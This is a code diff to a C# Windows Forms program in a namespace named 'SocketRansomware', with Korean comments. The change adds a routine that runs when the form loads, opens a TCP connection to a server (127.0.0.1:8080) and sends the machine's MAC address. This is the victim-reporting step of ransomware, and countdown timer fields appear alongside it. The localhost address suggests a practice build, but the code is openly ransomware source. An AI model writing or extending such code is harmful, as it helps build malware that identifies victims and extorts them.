@@ -7,12 +7,16 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Net;
+using System.Net.Sockets;
+using System.Net.NetworkInformation;
+
 
 namespace SocketRansomware
 {
     public partial class Form1 : Form
     {
-        
+        TcpClient client;
         public Form1()
         {
             InitializeComponent();
@@ -22,8 +26,53 @@ namespace SocketRansomware
         private int duration = 36000;
         private int duration2 = 43200;
         DateTime dt;
+        
+        private void ConnectServer()
+        {
+            try
+            {
+                client = new TcpClient(); //연결
+                client.Connect("127.0.0.1", 8080); //설정
+                SendDataServer();
+             
+            }
+            catch (SocketException)
+            {
+                MessageBox.Show("실패");
+            }
+            catch (Exception)
+            {
+                MessageBox.Show("실패");
+            }
+        }
+       //서버로 컴퓨터 정보 전송
+        private void SendDataServer()
+        {
+            byte[] buffer = new byte[1024];
+            string str = string.Empty;
+            str = NetworkInterface.GetAllNetworkInterfaces()[0].GetPhysicalAddress().ToString();
+
+            try
+            {
+                for (int i = 0; i < 1024; i++) buffer[i] = 0; //서버설명과 같음.
+                buffer = Encoding.Default.GetBytes(str);
+                NetworkStream net = client.GetStream(); //서버설명과 같음.
+                net.Write(buffer, 0, buffer.Length); //버퍼에 데이터를 씀 c++로따지면 send함수
+                net.Flush(); //버퍼비우기
+            }
+            catch (SocketException se)
+            {
+                MessageBox.Show("실패");
+            }
+            catch (Exception ee)
+            {
+                MessageBox.Show("실패");
+            }
+        }
+
         private void Form1_Load(object sender, EventArgs e)
         {
+            ConnectServer();
             cbboxLanguage.SelectedIndex = 0;
 
             dt = new DateTime();
